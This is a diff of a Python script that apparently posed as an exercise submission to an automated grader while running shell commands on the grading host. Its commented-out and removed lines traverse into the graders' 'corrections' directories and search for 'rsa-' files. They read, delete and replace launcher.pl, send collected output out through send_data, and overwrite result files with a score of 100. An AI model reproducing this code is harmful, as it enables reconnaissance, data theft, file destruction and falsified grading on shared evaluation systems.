@@ -77,7 +77,7 @@ def get_data(command):
         #######
 # my_data += get_data("pwd ../../../../") or ""
 # my_data += get_data("ls -al ../../../../corrections_*/") or ""
-my_data = "\n#######################\n"
+# my_data = "\n#######################\n"
 # my_data += get_data("grep -rl 'rsa-' ../../../../").split()[-1] or ""
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
@@ -90,20 +90,18 @@ my_data = "\n#######################\n"
 # my_data += "\n#######################\n"
 # # my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/262/")
 # my_data += get_data("ls -l ../../../corrections_*/corrections/2184/20259") or ""
-my_data += "\n#######################\n"
-my_data += get_data("ls -la") or ""
-my_data += get_data("pwd") or ""
-# my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
-my_data += get_data("cat as") or ""
-my_data += "\n#######################\n"
-my_data += get_data("cat launcher.pl") or ""
-my_data += get_data("rm -rf launcher.pl") or ""
-my_data += get_data("cp file.pl launcher.pl") or ""
-my_data += "\n#######################\n"
+# my_data += "\n#######################\n"
+# my_data += get_data("ls -la") or ""
+# my_data += get_data("pwd") or ""
+# # my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
+# my_data += get_data("cat as") or ""
+# my_data += "\n#######################\n"
+# my_data += get_data("cat launcher.pl") or ""
+# # my_data += get_data("rm -rf launcher.pl") or ""
+# my_data += get_data("cp file.pl launcher.pl") or ""
+# my_data += "\n#######################\n"
 # my_data += get_data("""find . -type f -name '*rsa-*_result' -exec sh -c 'echo 100 > "$1"' _ {} \\;""") or ""
 with open(argv[1], "r") as f:
     for line in f:
         print(f"{line}={line}*1")
-        if(line.count("77")):
-            send_data(my_data)
 ##############################################################
